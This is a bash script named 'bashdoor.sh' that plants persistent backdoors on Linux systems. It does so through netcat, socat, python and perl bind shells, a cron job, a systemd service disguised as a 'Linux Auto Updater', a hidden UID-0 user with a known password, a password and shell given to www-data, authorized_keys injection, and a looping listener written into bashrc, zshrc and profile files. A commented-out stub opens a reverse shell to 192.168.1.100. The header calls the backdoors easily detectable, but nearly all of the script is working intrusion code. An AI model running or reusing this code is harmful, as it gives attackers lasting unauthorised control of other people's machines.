#!/bin/bash

# ==============================================================================
# Script Name: bashdoor.sh
# Description: Tries to create easily detectable backdoors using different methods.
# Version: 1.0.0
# Author: mind2hex
# Date: 2024-11-18
# License: GPLv3
# ==============================================================================

# Exit immediately if a command exits with a non-zero status
set -e

# Treat unset variables as an error when substituting
set -u

# Function to show version
show_version() {
    echo "$0 version 1.0.0"
    exit 0
}

# Function to handle errors
error_exit() {
    echo "Error: $1" >&2
    exit 1
}

# 
#infect_service_configuration

create_malicious_cronjob(){
    # PORT 65532
    echo "* * * * * /usr/bin/nc -lvnp 65532 -e /bin/bash" | crontab -
}

# Creates a System/User level malicious service that starts a listener
create_malicious_service(){
    # PORT 65533
    service_config="
[Unit]
Description=Linux Auto Updater
After=network-online.target
Wants=network-online.target

[Service]
ExecStart=/usr/bin/nc -lvnp 65533 -e /bin/bash
Restart=always
RestartSec=20
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
    "
    linger=$(loginctl show-user $USER | grep --ignore-case linger | cut -d "=" -f 2)
    if [[ $EUID -eq 0 ]];then
        # Create system malicious service
        echo "${service_config}" > /etc/systemd/system/system-update.service
        systemctl daemon-reload
        systemctl enable system-update.service
        systemctl start system-update.service
    else
        # Create user-level malicious service
        mkdir -p ~/.config/systemd/user
        echo "${service_config}" > ~/.config/systemd/user/system-update.service
        systemctl --user daemon-reload
        systemctl --user enable system-update.service
        systemctl --user start  system-update.service
    fi
}

# Modify a system account to enable shell login 
infect_default_system_account(){
    if [[ $EUID -ne 0 ]];then
        return
    fi

    # Modify a system user creating a custom password and enabling shell use
    # www-data:backdoor 
    usermod --password '$6$U7D5xBMmqCRkIZGx$fvlgOsi7WHPZ2uZbmyH8Y9.gfo3xwWvU1Gfh61a7AtxrswC1xLhe1I5IIOiCYeMZCsujExacrkJEjhLz8YWa.1' -s /bin/bash www-data
}



create_malicious_shared_library(){
    # NOT READY YET
    # echo 'void _init() { system("/bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"); }' > payload.c
    # gcc -shared -fPIC -o /tmp/mylib.so payload.c
    # export LD_PRELOAD=/tmp/mylib.so
    echo ""
}

create_malicious_user(){
    if [[ $EUID -ne 0 ]];then
        return
    fi

    useradd -M -s /bin/bash -u 0 -o -g 0 kernoopsie
    usermod -p '$6$rb931J8MmQGko1gm$ZcXsXL38YtHn/4dslAbNyUFPEkT2DL0bt/W0q8xVTBBVg2PbOAm4IAULZDX5taqf7Q6BeHUOkcEcj1oHWrr.31' kernoopsie
    # kernoopsie:backdoor
}



infect_ssh_authorized_files(){
    if [[ $(echo "`systemctl status ssh.service`" | grep -o "Active: [a-zA-Z]*" -m1 | cut -d " " -f 2) == "inactive" ]];then
        return
    fi

    # Execute from attacking machine
    # cat ~/.ssh/id_rsa.pub | nc target 6922
    # ssh 
    echo "User:$(whoami)" | nc -lvnp 6922 >> ~/.ssh/authorized_keys
}

# this function search for tools that can be useful to start backdoors
backdoor_tool_finder(){
    backdoor_tool=""
    if nc -h 2>&1  | grep -o "\-e[^[:alnum:]]" -m1 >/dev/null;then
        # nc method 1
        backdoor_tool="nc -lvnp PORT-NUMBER -e /bin/bash"

    elif nc -h 2>&1 | grep -o "\-c[^[:alnum:]]" -m1;then
        # nc method 2
        backdoor_tool="nc -lvnp PORT-NUMBER -c '/bin/bash'"

    elif command -v socat >/dev/null 2>&1;then
        # socat method 1
        backdoor_tool="socat TCP-LISTEN:PORT-NUMBER,reuseaddr EXEC:/bin/bash"

    elif command -v python3 >/dev/null 2>&1;then
        # python method 1
        backdoor_tool="python3 -c 'import socket,os,pty;s=socket.socket();s.bind((\"0.0.0.0\",PORT-NUMBER));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);pty.spawn(\"/bin/bash\")'"
    
    elif command -v perl >/dev/null 2>&1;then
        # perl method 1
        backdoor_tool="perl -e 'use Socket;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));bind(S,sockaddr_in($p,INADDR_ANY));listen(S,SOMAXCONN);while(accept(C,S)){open(STDIN, \"<&C\");open(STDOUT, \">&C\");open(STDERR, \">&C\");exec(\"/bin/bash\");}'"

    else
        # no tools found
        return 1
    fi

    # Unmark to test one specifically method
    #backdoor_tool="nc -lvnp PORT-NUMBER -e /bin/bash" 
    #backdoor_tool="nc -lvnp PORT-NUMBER -c '/bin/bash'"
    #backdoor_tool="socat TCP-LISTEN:PORT-NUMBER,reuseaddr EXEC:/bin/bash"
    #backdoor_tool="python3 -c 'from sys import argv;from base64 import b64decode;exec(b64decode(b\"aW1wb3J0IHNvY2tldCxvcyxwdHkKcz1zb2NrZXQuc29ja2V0KCkKcy5iaW5kKCgnMC4wLjAuMCcsaW50KGFyZ3ZbMV0pKSkKcy5saXN0ZW4oMSkKYyxhPXMuYWNjZXB0KCkKb3MuZHVwMihjLmZpbGVubygpLDApCm9zLmR1cDIoYy5maWxlbm8oKSwxKQpvcy5kdXAyKGMuZmlsZW5vKCksMikKcHR5LnNwYXduKCcvYmluL2Jhc2gnKQ==\"))' 6969"
    
}

# Infect bash environment file
infect_shell_environment() {
    # $1 -> Port number to use

    local instruction="nohup bash -c 'while true; do $(echo $backdoor_tool | sed s/PORT-NUMBER/$1/ ); done' >/dev/null 2>&1 &"

    bash_shell_environment=(
        /etc/bash.bashrc
        /etc/bash_completion
        ~/.bashrc
        ~/.profile
    )

    zsh_shell_environment=(
        /etc/zsh/zshrc
        /etc/zsh/zshenv
        ~/.zshrc
    )

    if [[  $SHELL == "/usr/bin/zsh" ]];then
        # Infecting user environment file
        if [[ -e /etc/zsh/zshrc && $EUID -eq 0 ]];then
            # Inserting instruction in the start of file /etc/bash.bashrc
            # default configuration for bashrc
            if ! grep "$instruction" /etc/zsh/zshrc;then
                sed -i "1i $instruction" /etc/zsh/zshrc
            fi

        elif [[ -e /etc/zshenv && $EUID -eq 0 ]];then
            # Inserting instruction in the start of file /etc/bash_completion
            # default configuration for bashrc
            if ! grep "$instruction" /etc/zsh/zshenv;then
                sed -i "1i $instruction" /etc/zsh/zshenv
            fi

        elif [[ -e ~/.zshrc ]];then
            # Inserting instruction in the start of file ~/.bashrc
            # individual bash configuration file for every user
            if ! grep "$instruction" ~/.zshrc;then
                sed -i "1i $instruction" ~/.zshrc
            fi

        elif [[ -e ~/.profile ]];then
            # Inserting instruction in the start of file ~/.profile
            # individual bash configuration file for every user
            if ! grep "$instruction" ~/.profile;then
                sed -i "1i $instruction" ~/.profile
            fi
        fi

    elif [[ $SHELL == "/usr/bin/bash" ]];then
        # Infecting user environment file
        if [[ -e /etc/bash.bashrc && $EUID -eq 0 ]];then
            # Inserting instruction in the start of file /etc/bash.bashrc
            # default configuration for bashrc
            if ! grep "$instruction" /etc/bash.bashrc;then
                sed -i "1i $instruction" /etc/bash.bashrc
            fi

        elif [[ -e /etc/bash_completion && $EUID -eq 0 ]];then
            # Inserting instruction in the start of file /etc/bash_completion
            # default configuration for bashrc
            if ! grep "$instruction" /etc/bash_completion;then
                sed -i "1i $instruction" /etc/bash_completion
            fi

        elif [[ -e ~/.bashrc ]];then
            # Inserting instruction in the start of file ~/.bashrc
            # individual bash configuration file for every user
            if ! grep "$instruction" ~/.bashrc;then
                sed -i "1i $instruction" ~/.bashrc
            fi

        elif [[ -e ~/.profile ]];then
            # Inserting instruction in the start of file ~/.profile
            # individual bash configuration file for every user
            if ! grep "$instruction" ~/.profile;then
                sed -i "1i $instruction" ~/.profile
            fi
        fi
    fi
}

# Main logic of the script
main() {

    backdoor_tool_finder

    infect_shell_environment 65535
    
    #infect_default_system_account
    ##infect_service_configuration
    ##infect_ssh_authorized_files
    #create_malicious_shared_library
    #create_malicious_cronjob
    #create_malicious_service
    #create_malicious_user
}

# Run the main function
main
